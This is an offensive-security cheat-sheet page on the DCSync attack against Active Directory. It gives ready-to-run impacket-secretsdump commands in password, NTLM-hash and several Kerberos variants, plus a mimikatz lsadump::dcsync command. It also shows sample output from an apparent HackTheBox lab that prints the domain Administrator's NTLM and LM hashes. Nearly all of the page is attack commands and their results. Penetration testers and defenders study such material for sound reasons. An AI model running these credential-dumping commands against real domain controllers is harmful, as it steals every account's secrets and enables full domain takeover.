---
title: "GetChanges/GetChangesAll"
tags: ["Active Directory", "GetChanges/GetChangesAll", "Dcsync", "Getchanges", "Getchangesall", "Secrets Dump", "Windows"]
---

{{< filter_buttons >}}

### DCSync Attack

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console {class="password"}
# Password
impacket-secretsdump '<USER>:<PASSWORD>@<TARGET>' -just-dc
```

```console {class="ntlm"}
# NTLM
impacket-secretsdump '<DOMAIN>/<USER>@<TARGET>' -hashes :<HASH> -just-dc
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
impacket-secretsdump '<USER>:<PASSWORD>@<TARGET>' -k -just-dc
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
impacket-secretsdump '<DOMAIN>/<USER>@<TARGET>' -hashes :<HASH> -k -just-dc
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
impacket-secretsdump '<DOMAIN>/<USER>@<TARGET>' -k -no-pass -just-dc
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

```console
.\mimikatz.exe "lsadump::dcsync /domain:<DOMAIN> /user:administrator" "exit"
```

```console {class="sample-code"}
PS C:\programdata> .\mimikatz.exe "lsadump::dcsync /domain:HTB.LOCAL /user:administrator" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 May 17 2024 22:19:06
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /domain:HTB.LOCAL /user:administrator
[DC] 'HTB.LOCAL' will be the domain
[DC] 'sizzle.HTB.LOCAL' will be the DC server
[DC] 'administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000200 ( NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 7/12/2018 1:32:41 PM
Object Security ID   : S-1-5-21-2379389067-1826974543-3574127760-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: f6b7160bfc91823792e0ac3a162c9267
    ntlm- 0: f6b7160bfc91823792e0ac3a162c9267
    ntlm- 1: c718f548c75062ada93250db208d3178
    lm  - 0: 336d863559a3f7e69371a85ad959a675

---[SNIP]---

mimikatz(commandline) # exit
Bye!
```

{{< /tabcontent >}}
